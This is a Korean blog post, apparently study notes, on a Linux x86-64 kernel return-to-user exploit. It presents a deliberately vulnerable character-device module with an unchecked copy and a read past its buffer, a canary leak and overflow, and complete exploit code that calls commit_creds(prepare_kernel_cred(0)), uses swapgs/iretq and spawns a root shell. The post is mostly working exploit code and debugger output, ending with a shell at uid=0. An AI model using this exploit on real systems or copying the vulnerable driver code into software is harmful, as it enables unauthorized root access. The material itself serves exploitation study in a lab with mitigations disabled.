---
title: Return-to-user - x64
author: Beomsu Lee
category: [Exploitation, Kernel]
tags: [exploitation, kernel, return-to-user]
math: true
mermaid: true
---

## Set environment

**리눅스 배포판, 커널 버전 정보**

```
bs@bs-virtual-machine:~/Desktop$ uname -a
Linux bs-virtual-machine 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
bs@bs-virtual-machine:~/Desktop$ uname -r
4.4.0-31-generic
```

- SMEP, SMAP, KASLR, KADR 해제

## Proof of concept

x86 ret2usr에서 사용한 코드를 사용한다.

**chardev.c**

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/sched.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <asm/current.h>
#include <linux/uaccess.h>

MODULE_LICENSE("Dual BSD/GPL");

#define DRIVER_NAME "chardev"
#define BUFFER_SIZE 64
    
static const unsigned int MINOR_BASE = 0;
static const unsigned int MINOR_NUM  = 2;
static unsigned int chardev_major;
static struct cdev chardev_cdev;
static struct class *chardev_class = NULL;

static int     chardev_release(struct inode *, struct file *);
static ssize_t chardev_read(struct file *, char *, size_t, loff_t *);
static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *);
static loff_t chardev_lseek(struct file *, loff_t, int);

struct file_operations chardev_fops = {
    .release = chardev_release,
    .read    = chardev_read,
    .write   = chardev_write,
    .llseek = chardev_lseek,
};

struct data {
    unsigned char buffer[BUFFER_SIZE];
};

static int chardev_init(void)
{
    int alloc_ret = 0;
    int cdev_err = 0;
    dev_t dev;

    printk("The chardev_init() function has been called.");
    
    alloc_ret = alloc_chrdev_region(&dev, MINOR_BASE, MINOR_NUM, DRIVER_NAME);
    if (alloc_ret != 0) {
        printk(KERN_ERR  "alloc_chrdev_region = %d\n", alloc_ret);
        return -1;
    }
    //Get the major number value in dev.
    chardev_major = MAJOR(dev);
    dev = MKDEV(chardev_major, MINOR_BASE);

    //initialize a cdev structure
    cdev_init(&chardev_cdev, &chardev_fops);
    chardev_cdev.owner = THIS_MODULE;

    //add a char device to the system
    cdev_err = cdev_add(&chardev_cdev, dev, MINOR_NUM);
    if (cdev_err != 0) {
        printk(KERN_ERR  "cdev_add = %d\n", alloc_ret);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }

    chardev_class = class_create(THIS_MODULE, "chardev");
    if (IS_ERR(chardev_class)) {
        printk(KERN_ERR  "class_create\n");
        cdev_del(&chardev_cdev);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }

    device_create(chardev_class, NULL, MKDEV(chardev_major, MINOR_BASE), NULL, "chardev%d", MINOR_BASE);

    return 0;
}

static void chardev_exit(void)
{
    int minor;
    dev_t dev = MKDEV(chardev_major, MINOR_BASE);
    
    printk("The chardev_exit() function has been called.");
    
    for (minor = MINOR_BASE; minor < MINOR_BASE + MINOR_NUM; minor++) {
        device_destroy(chardev_class, MKDEV(chardev_major, minor));
    }

    class_destroy(chardev_class);
    cdev_del(&chardev_cdev);
    unregister_chrdev_region(dev, MINOR_NUM);
}

static int chardev_release(struct inode *inode, struct file *file)
{
    printk("The chardev_release() function has been called.");
    if (file->private_data) {
        kfree(file->private_data);
        file->private_data = NULL;
    }
    return 0;
}

static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
    char data[BUFFER_SIZE];
    printk("The chardev_write() function has been called.");  
    printk("Before calling the copy_from_user() function : %p",data);
    if (_copy_from_user(&data, buf, count) != 0) {
        return -EFAULT;
    }
/*
    if (copy_from_user(&data, buf, count) != 0) {
        return -EFAULT;
    }
    if (__copy_from_user(&data, buf, count) != 0) {
        return -EFAULT;
    }
*/
    printk("After calling the copy_from_user() function : %p",data);
    return count;
}

static ssize_t chardev_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)
{
    char data[BUFFER_SIZE];

    printk("The chardev_read() function has been called.\n");
    memset(data, 0, sizeof(data));
    strcpy(data, "Welcome to the CSAW CTF challenge. Best of luck!\n");
    printk("MSG : %s",data);
    printk("f_pos : %lld\n",*f_pos);
    if (memcpy(buf, data + *f_pos, 64) != 0) {
    printk("Error\n");
        return -EFAULT;
    }

    return count;
}

static loff_t chardev_lseek(struct file *file, loff_t offset, int orig) {
    loff_t new_pos = 0;
    printk("The chardev_lseek() function has been called.");
    switch(orig) {
        case 0 : /*seek set*/
            new_pos = offset;
            break;
        case 1 : /*seek cur*/
            new_pos = file->f_pos + offset;
            break;
        case 2 : /*seek end*/
            new_pos = BUFFER_SIZE - offset;
            break;
    }
    if(new_pos > BUFFER_SIZE)
        new_pos = BUFFER_SIZE;
    if(new_pos < 0)
        new_pos = 0;
    file->f_pos = new_pos;
    return new_pos;
}
```

**Makefile**

```makefile
obj-m = chardev.o
all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

**test.c**

```c
//gcc -static -o test test.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#define TEXT_LEN 64
int main()
{
    static char buf[128];
    int fd;
    if ((fd = open("/dev/chardev0", O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }
    memset (buf, 'A', TEXT_LEN);
    lseek(fd,0x0,SEEK_CUR);
    read(fd, buf, TEXT_LEN);
    printf("%s", buf);
    if (close(fd) != 0){
        printf("Cannot close.\n");
    }
    return 0;
}
```

`copy_to_user()` 함수 인자 및 canary와의 거리(0x40)를 확인한다.

```
3: x/i $rip
=> 0xffffffffc0124238:  call   0xffffffff813e09e0 <_copy_to_user>
(gdb) info r
...
rdx            0x40                64
rsi            0xffff8800bbb3be58  -131938246214056
rdi            0x6c1ca0            7085216
...
(gdb) x/s 0x6c1ca0
0x6c1ca0:   'A' <repeats 64 times>
(gdb) x/s 0xffff8800bbb3be58
0xffff8800bbb3be58: "Welcome to the CSAW CTF challenge. Best of luck!\n"
(gdb) x/24gx 0xffff8800bbb3be58
0xffff8800bbb3be58: 0x20656d6f636c6557  0x4320656874206f74
0xffff8800bbb3be68: 0x2046544320574153  0x676e656c6c616863
0xffff8800bbb3be78: 0x2074736542202e65  0x216b63756c20666f
0xffff8800bbb3be88: 0x000000000000000a  0x0000000000000000
0xffff8800bbb3be98: 0x00000000fd7a8542 <- canary    0x00000000006c1ca0
0xffff8800bbb3bea8: 0xffff88012a130700  0xffff8800bbb3bf20
0xffff8800bbb3beb8: 0x0000000000000040  0xffff8800bbb3bed0
0xffff8800bbb3bec8: 0xffffffff811fd378  0xffff8800bbb3bf08
0xffff8800bbb3bed8: 0xffffffff811fd92f  0xffff88012a130700
0xffff8800bbb3bee8: 0xffff88012a130700  0x00000000006c1ca0
0xffff8800bbb3bef8: 0x0000000000000040  0x0000000000000000
0xffff8800bbb3bf08: 0xffff8800bbb3bf48  0xffffffff811fe706
(gdb) p/x 0xffff8800bbb3be98-0xffff8800bbb3be58
$1 = 0x40
```

### Overflow

overflow 발생시키는 코드이다.

```c
//gcc -static -o test test.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

#define TEXT_LEN 64

int main()
{
    char buf[128];
    char canary[4];
    int fd;
    
    if ((fd = open("/dev/chardev0", O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }
    
    memset (buf, 'A', TEXT_LEN);

    lseek(fd,0x40,SEEK_CUR);
    read(fd, buf, TEXT_LEN);
    //printf("%s", buf);
    memcpy(canary,buf,0x8);
    printf("canary: 0x%x%x%x%x\n",canary[3]&0xff,canary[2]&0xff,canary[1]&0xff,canary[0]&0xff);
    memset(buf,'A',0x40);
    memcpy(buf+0x40,canary,0x8);
    memset(buf+0x48,'B',0x18);
    memset(buf+0x60,'C',0x8);
    write(fd,buf,0x68);
    
    if (close(fd) != 0){
        printf("Cannot close.\n");
    }
    return 0;
}
```

overflow가 발생하였다.

```
3: x/i $rip
=> 0xffffffffc0124144:  ret    
(gdb) x/24gx $rsp
0xffff88012b80fec0: 0x4343434343434343 <- ret   0xffff88012b80ff08
0xffff88012b80fed0: 0xffffffff811fda82  0xffffffff81067c27
```

64bit `tf` 생성 후 쉘 실행시키는 코드 작성한다.

```c
//gcc -static -o test test.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>

#define TEXT_LEN 64
unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred); 
struct trap_frame {
    void *user_rip ;        // instruction pointer
    uint64_t user_cs ;      // code segment
    uint64_t user_rflags ;  // CPU flags
    void *user_rsp ;        // stack pointer
    uint64_t user_ss ;      // stack segment
} __attribute__((packed));
struct trap_frame tf;

void getShell(void) {
    execl("/bin/sh", "sh", NULL);
}
    
void prepare_tf(void) {
    asm("mov tf+8, cs;"
        "pushf; pop tf+16;"
        "mov tf+24, rsp;"
        "mov tf+32, ss;"
        );
    tf.user_rip = &getShell ;
}

void payload(void)
{
    commit_creds(prepare_kernel_cred(0));
    //asm("swapgs;"
    asm("mov %%rsp, %0;"
        "iretq;"
    : : "r" (&tf));
}

unsigned long kallsyms_getaddr(const char* str){
    FILE *fp;
    char buf[128];
    char sym[128];
    char addr[32];
    if((fp=fopen("/proc/kallsyms","r")) < 0){
        perror("fopen() error");
    }
    while(fgets(buf,256,fp) != NULL){
        memset(addr,0x0,sizeof(addr));
        memset(sym,0x0,sizeof(sym));
        sscanf(buf,"%s %*s %s",addr,sym);
        if(strcmp(str,sym)==0){
            printf("%s : %s\n",sym,addr);   
            return strtoul(addr, NULL, 16);
        }
    }
    if(fclose(fp)<0){
        perror("fclose error");
    }
    return 0;   
}

int main()
{
    char buf[128];
    char canary[4];
    int fd;
    prepare_kernel_cred = kallsyms_getaddr("prepare_kernel_cred");
    if(prepare_kernel_cred == 0){
    printf("prepare kernel cred not found\n");
    exit(0);
    }
    printf("prepare_kernel_cred: %p\n",prepare_kernel_cred);
    if((commit_creds = kallsyms_getaddr("commit_creds"))==0){
    printf("prepare kernel cred not found\n");
    exit(0);
    }
    printf("commit_creds: %p\n",commit_creds);
    
    if ((fd = open("/dev/chardev0", O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }
    
    memset (buf, 'A', TEXT_LEN);

    lseek(fd,0x40,SEEK_CUR);
    read(fd, buf, TEXT_LEN);
    //printf("%s", buf);
    memcpy(canary,buf,0x8);
    printf("canary: 0x%x%x%x%x\n",canary[3]&0xff,canary[2]&0xff,canary[1]&0xff,canary[0]&0xff);
    memset(buf,'A',0x40);
    memcpy(buf+0x40,canary,0x8);
    memset(buf+0x48,'B',0x18);
    *(void**)(buf+0x60) = &payload;
    prepare_tf();
    write(fd,buf,0x68);
    
    if (close(fd) != 0){
        printf("Cannot close.\n");
    }
    return 0;
}
```

**`iretq` 전 `rsp(tf)`**

```
1: x/i $rip
=> 0x4010d7:    iretq 
(gdb) x/24gx $rsp
0x6c4aa0:   0x000000000040105e  0x0000000000000033
0x6c4ab0:   0x0000000000000206  0x00007ffd82c41930
0x6c4ac0:   0x000000000000002b  0xffffffff8109d760
0x6c4ad0:   0xffffffff8109da40  0x0000000000000000
```

**`iret` 후 레지스터**

```
(gdb) si
0x000000000040105e in ?? ()
1: x/i $rip
=> 0x40105e:    push   rbp
(gdb) info r
rax            0x6c4aa0            7096992
rbx            0xffffffff8109d760  -2130061472
rcx            0xcd                205
rdx            0xce                206
rsi            0x40                64
rdi            0xffff88013506a940  -131936210736832
rbp            0xffff88007fcbfec0  0xffff88007fcbfec0
rsp            0x7ffd82c41930      0x7ffd82c41930
r8             0xffff880081f8e878  -131939214759816
r9             0xffff880139007c00  -131936144032768
r10            0xffff880089a97ee0  -131939085746464
r11            0x0                 0
r12            0x4242424242424242  4774451407313060418
r13            0x68                104
r14            0xffff88007fcbff20  -131939251257568
r15            0x0                 0
rip            0x40105e            0x40105e
eflags         0x206               [ PF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x63                99
gs             0x0                 0
```

본문엔 `general_protection()` 함수가 호출되지만 나의 경우 커널 패닉(page fault)이 되어버린다.

### General protection fault

general protection fault는 커널이나 사용자 프로그램에서 실행되는 코드에 의해 발생하며, 액세스 위반에 의해 발생한다.

**entry_64.S**

```c
/*
* Hypervisor uses this for application faults while it executes.
* We get here for two reasons:
*  1. Fault while reloading DS, ES, FS or GS  <- DS, ES, FS, GS 때문에 발생
*  2. Fault while executing IRET              <- iret에 의해 발생
* Category 1 we do not need to fix up as Xen has already reloaded all segment
* registers that could be reloaded and zeroed the others.
* Category 2 we fix up by killing the current process. We cannot use the
* normal Linux return path in this case because if we use the IRET hypercall
* to pop the stack frame we end up in an infinite loop of failsafe callbacks.
* We distinguish between categories by comparing each saved segment register
* with its current contents: any discrepancy means we in category 1.
*/
ENTRY(xen_failsafe_callback)
    movl    %ds, %ecx
    cmpw    %cx, 0x10(%rsp)
    jne 1f
    movl    %es, %ecx
    cmpw    %cx, 0x18(%rsp)
    jne 1f
    movl    %fs, %ecx
    cmpw    %cx, 0x20(%rsp)
    jne 1f
    movl    %gs, %ecx
    cmpw    %cx, 0x28(%rsp)
    jne 1f
    /* All segments match their saved values => Category 2 (Bad IRET). */
    movq    (%rsp), %rcx
    movq    8(%rsp), %r11
    addq    $0x30, %rsp
    pushq   $0              /* RIP */
    pushq   %r11
    pushq   %rcx
    jmp general_protection
1:  /* Segment mismatch => Category 1 (Bad segment). Retry the IRET. */
    movq    (%rsp), %rcx
    movq    8(%rsp), %r11
    addq    $0x30, %rsp
    pushq   $-1 /* orig_ax = -1 => not a system call */
    ALLOC_PT_GPREGS_ON_STACK
    SAVE_C_REGS
    SAVE_EXTRA_REGS
    jmp error_exit
END(xen_failsafe_callback)

apicinterrupt3 HYPERVISOR_CALLBACK_VECTOR \
    xen_hvm_callback_vector xen_evtchn_do_upcall

#endif /* CONFIG_XEN */

#if IS_ENABLED(CONFIG_HYPERV)
apicinterrupt3 HYPERVISOR_CALLBACK_VECTOR \
    hyperv_callback_vector hyperv_vector_handler
#endif /* CONFIG_HYPERV */

idtentry debug          do_debug        has_error_code=0    paranoid=1 shift_ist=DEBUG_STACK
idtentry int3           do_int3         has_error_code=0    paranoid=1 shift_ist=DEBUG_STACK
idtentry stack_segment      do_stack_segment    has_error_code=1

#ifdef CONFIG_XEN
idtentry xen_debug      do_debug        has_error_code=0
idtentry xen_int3       do_int3         has_error_code=0
idtentry xen_stack_segment  do_stack_segment    has_error_code=1
#endif

idtentry general_protection do_general_protection   has_error_code=1
trace_idtentry page_fault   do_page_fault       has_error_code=1

#ifdef CONFIG_KVM_GUEST
idtentry async_page_fault   do_async_page_fault has_error_code=1
#endif
```

### SWAPGS

위의 에러를 해결하기 위해 SWAPGS 명령어를 이용해 GS레지스터의 값을 변경해야 한다. SWAPGS 명령어는 GS.base의 값을 MSR의 KernelGSbase(C0000102H) 값과 교환하는 명령어이다. * [https://www.felixcloutier.com/x86/swapgs](https://www.felixcloutier.com/x86/swapgs)

`payload()` 함수에 `swapgs;` 어셈블리 코드를 추가한다.

## Exploit code

```c
//gcc -static -o exploit exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>

#define TEXT_LEN 64
unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred); 
struct trap_frame {
    void *user_rip ;        // instruction pointer
    uint64_t user_cs ;      // code segment
    uint64_t user_rflags ;  // CPU flags
    void *user_rsp ;        // stack pointer
    uint64_t user_ss ;      // stack segment
} __attribute__((packed));
struct trap_frame tf;

void getShell(void) {
    execl("/bin/sh", "sh", NULL);
}
    
void prepare_tf(void) {
    asm("mov tf+8, cs;"
        "pushf; pop tf+16;"
        "mov tf+24, rsp;"
        "mov tf+32, ss;"
        );
    tf.user_rip = &getShell ;
}

void payload(void)
{
    commit_creds(prepare_kernel_cred(0));
    asm("swapgs;"
    "mov %%rsp, %0;"
        "iretq;"
    : : "r" (&tf));
}

unsigned long kallsyms_getaddr(const char* str){
    FILE *fp;
    char buf[128];
    char sym[128];
    char addr[32];
    if((fp=fopen("/proc/kallsyms","r")) < 0){
        perror("fopen() error");
    }
    while(fgets(buf,256,fp) != NULL){
        memset(addr,0x0,sizeof(addr));
        memset(sym,0x0,sizeof(sym));
        sscanf(buf,"%s %*s %s",addr,sym);
        if(strcmp(str,sym)==0){
            printf("%s : %s\n",sym,addr);   
            return strtoul(addr, NULL, 16);
        }
    }
    if(fclose(fp)<0){
        perror("fclose error");
    }
    return 0;   
}

int main()
{
    char buf[128];
    char canary[4];
    int fd;
    prepare_kernel_cred = kallsyms_getaddr("prepare_kernel_cred");
    if(prepare_kernel_cred == 0){
    printf("prepare kernel cred not found\n");
    exit(0);
    }
    printf("prepare_kernel_cred: %p\n",prepare_kernel_cred);
    if((commit_creds = kallsyms_getaddr("commit_creds"))==0){
    printf("prepare kernel cred not found\n");
    exit(0);
    }
    printf("commit_creds: %p\n",commit_creds);
    
    if ((fd = open("/dev/chardev0", O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }
    
    memset (buf, 'A', TEXT_LEN);

    lseek(fd,0x40,SEEK_CUR);
    read(fd, buf, TEXT_LEN);
    //printf("%s", buf);
    memcpy(canary,buf,0x8);
    printf("canary: 0x%x%x%x%x\n",canary[3]&0xff,canary[2]&0xff,canary[1]&0xff,canary[0]&0xff);
    memset(buf,'A',0x40);
    memcpy(buf+0x40,canary,0x8);
    memset(buf+0x48,'B',0x18);
    *(void**)(buf+0x60) = &payload;
    prepare_tf();
    write(fd,buf,0x68);
    
    if (close(fd) != 0){
        printf("Cannot close.\n");
    }
    return 0;
}
```

## Exploit

```bash
bs@bs-virtual-machine:~/Desktop$ ./test 
prepare_kernel_cred : ffffffff8109da40
prepare_kernel_cred: 0xffffffff8109da40
commit_creds : ffffffff8109d760
commit_creds: 0xffffffff8109d760
canary: 0xffd62021
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/home/bs/Desktop
```

## References
- [02.Stack smashing(64bit) & Return-to-user(ret2usr)](https://www.lazenca.net/pages/viewpage.action?pageId=25624684)